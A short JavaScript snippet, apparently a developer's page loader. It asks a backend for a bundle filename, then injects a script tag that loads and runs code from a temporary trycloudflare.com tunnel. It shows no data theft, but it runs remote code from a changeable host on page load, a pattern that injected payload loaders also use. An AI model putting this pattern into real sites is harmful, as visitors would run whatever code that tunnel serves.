(async function () {
  // 1. Ask your backend for the CURRENT filename
  const response = await fetch(
    "https://test-big-consultation.zend-apps.com/get-bundle-name",
  );
  const data = await response.json();

  const script = document.createElement("script");
  // 2. Use the Cloudflare domain + the dynamic filename
  script.src = `https://interpretation-physical-cheap-publication.trycloudflare.com/static/js/${data.fileName}`;
  script.async = true;
  document.body.appendChild(script);
})();
